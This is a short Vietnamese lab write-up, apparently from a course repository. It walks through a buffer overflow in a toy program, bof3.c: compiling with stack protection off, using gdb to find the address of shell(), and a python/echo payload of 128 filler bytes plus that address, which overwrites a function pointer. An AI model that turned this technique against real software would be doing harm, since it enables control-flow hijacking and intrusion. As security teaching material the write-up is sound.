### Chi tiết Buffer-overflow trên file bof3.c
***
#### Mục đích của bài này là dùng buffer-overflow để gọi được hàm shell()
Xem qua code ta có thể thấy lỗ hỏng nó đến từ hàm fget(buf, 133, stdin). Vì vậy ta sẽ dùng buffer-overflow để làm tràn biến buf xuống phần biến func() và cái phần được tràn vào biến func() là địa chỉ của hàm shell() thì lúc đó hàm shell() sẽ được gọi


![image](https://github.com/user-attachments/assets/0da879ec-3bb7-4b00-ae7c-0625d878529d)

***
#### Các bước thực hiện
* Bước 1: Biên dịch file
  ```
  gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2
  ```
* Bước 2: Lấy địa chỉ hàm shell()

  Vào gdb:
  ```
  qdb -q bof3.out  
  ```
  Xem địa chỉ hàm
  ```
  disas shell 
  ```
  ![image](https://github.com/user-attachments/assets/6339981d-f94c-48b4-b45a-dcf75dd62ff5)


  => Địa chỉ hàm shell() là 0x0804845b
* Bước 3: Điểm qua stackframe

  
  ![image](https://github.com/user-attachments/assets/f869ff68-d7a2-4920-9bfc-47d3214de52d)



  ta thấy mảng buf chứa tối đa 128 bytes nên ta cần truyền vào input 128 kí
  tự ngẫu nhiên và truyền thêm 4 bytes địa chỉ hàm shell() nữa để đè lên giá trị của biến func() là ta có thể gọi hàm này
* Bước 4: Thực hiện truyền input
  ```
  echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
  ```
  Kết quả:
  ![image](https://github.com/user-attachments/assets/851ed183-3222-46a9-b808-f7a821951edf)


  => Thành công
